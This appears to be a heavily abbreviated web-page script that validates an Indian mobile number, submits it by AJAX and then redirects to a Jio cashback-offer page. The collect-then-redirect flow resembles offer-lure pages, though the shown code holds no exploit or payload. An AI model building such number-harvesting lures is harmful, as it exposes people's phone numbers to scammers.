		...
		<script type="text/javascript">
			...
			$(document).ready(function(){
				...
				function validate_mobile(mob){
					...
					var pattern =  /^[6-9]\d{9}$/; // check whether the entered mobile number is valid indian mobile number or not
						...
						$.ajax({
							...
							success: function(data){
									...
									if (data == "success") {
		                                ...
		                                setInterval(()=>{
			                            count++;
			                            if(count>1) location.replace("https://www.jio.com/en-in/jio-cashback-offer")
		                             })
